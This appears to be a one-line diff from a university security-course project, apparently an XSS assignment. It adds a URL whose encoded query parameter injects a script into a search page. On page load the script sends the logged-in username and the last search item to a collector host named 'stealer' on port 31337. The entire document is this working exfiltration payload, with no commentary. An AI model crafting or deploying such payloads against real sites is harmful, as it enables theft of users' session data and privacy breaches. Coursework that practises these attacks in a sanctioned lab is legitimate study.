@@ -1,1 +1,1 @@
-https://project2.eecs388.org/search?xssdefense=3&q=
+https://project2.eecs388.org/search?xssdefense=3&q=%3Cscript%3E%0A%09function%20attack%28%29%20%7B%0A%09%09%24.get%28%60http%3A%2F%2Fstealer%3A31337%2F%3Fstolen_user%3D%60%20%2B%20%24%28%60%23logged-in-user%60%29.text%28%29%20%20%2B%20%60%26last_search%3D%60%20%2B%20%24%28%60.list-group-item%3Aeq%281%29%60%29.text%28%29%29%0A%09%7D%0Awindow.onload%20%3D%20attack%3B%0A%3C%2Fscript%3E
